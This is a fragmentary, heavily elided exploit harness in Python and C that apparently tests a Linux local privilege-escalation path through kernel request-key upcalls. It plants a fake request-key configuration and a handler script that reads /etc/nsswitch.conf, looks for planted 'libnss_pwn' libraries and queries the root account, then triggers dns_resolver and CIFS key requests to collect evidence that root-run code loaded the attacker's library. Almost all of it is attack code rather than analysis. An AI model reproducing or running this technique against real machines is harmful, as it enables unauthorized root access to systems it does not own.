...
HANDLER_MARKER = Path("/tmp/hm_%s.txt" % RUN_TOKEN)
...
static long do_request_key_i386(const char *type, const char *desc)
{
        ...
        char *lt = lo;
        char *ld = lt + strlen(type) + 1;
        char *le = ld + strlen(desc) + 1;
        strcpy(lt, type);
        strcpy(ld, desc);
        le[0] = '\0';
...
static long do_request_key_exec(const char *type, const char *desc)
{
        pid_t pid;
        int status;
        ...
        pid = fork();
        if (pid == 0) {
                execlp("keyctl", "keyctl", "request2", type, desc, "", "@s",
                       (char *)NULL);
                _exit(127);
        }
        if (pid < 0) return -1;
...
int main(int argc, char **argv)
{
...

        {
                ...
                snprintf(rk, sizeof(rk), "rk%d.invalid", getpid());
                fprintf(stderr, "\n[1] dns_resolver (%s)...\n", rk);
                sigprocmask(SIG_SETMASK, &blk, &old);
                errno = 0;
                ret = do_request_key("dns_resolver", rk);
                sigprocmask(SIG_SETMASK, &old, NULL);
                fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                        ret, errno, strerror(errno));

                if (ret < 0 && errno == EINTR) {
                        snprintf(rk, sizeof(rk), "rk%d-r.invalid", getpid());
        ...
        snprintf(desc, sizeof(desc),
                 ...
                 getpid());
        fprintf(stderr, "[2] cifs.spnego...\n");
        errno = 0;
        ret = do_request_key("cifs.spnego", desc);
        fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                ret, errno, strerror(errno));

        fprintf(stderr, "[3] cifs.idmap...\n");
        errno = 0;
...
def main() -> None:
    ...
    handler_sh = WORKDIR / "handler.sh"
    handler_sh.write_text(
        "#!/bin/sh\n"
        "M={m}\n"
        'echo "handler uid=$(id -u) ns=$(readlink /proc/self/ns/mnt 2>/dev/null)" > "$M"\n'
        'cat /etc/nsswitch.conf >> "$M" 2>&1\n'
        'ls /usr/lib64/libnss_pwn* >> "$M" 2>&1\n'
        "/usr/bin/getent passwd root >> \"$M\" 2>&1\n"
        'echo "getent_rc=$?" >> "$M"\n'
        'exec /usr/bin/keyctl negate "$1" 30 "$4"\n'
        .format(m=str(HANDLER_MARKER)),
        encoding="utf-8",
    )
    handler_sh.chmod(0o755)
    FAKE_REQKEY.write_text(
        "create dns_resolver * * {h} %k %d %c %S\n"
        "create cifs.idmap  * * {h} %k %d %c %S\n"
        "create cifs.spnego * * /usr/sbin/cifs.upcall %k\n"
        "negate * * * /usr/bin/keyctl negate %k 30 %S\n"
        .format(h=str(handler_sh)),
        encoding="utf-8",
    )
    write_text(
        FAKE_HOSTS,
    ...
    if HANDLER_MARKER.exists():
        step("HANDLER DIAGNOSTIC")
        print(HANDLER_MARKER.read_text(encoding="utf-8", errors="replace"), end="", flush=True)
    else:
        print("\n(no handler marker at %s - handler.sh did NOT run)" % HANDLER_MARKER, flush=True)
    ...
    if not evidence:
        ...
        raise SystemExit(
            ...
            "dns_resolver, cifs.spnego and cifs.idmap were all attempted. "
            "Check the trigger output above for per-type errno details."
        )
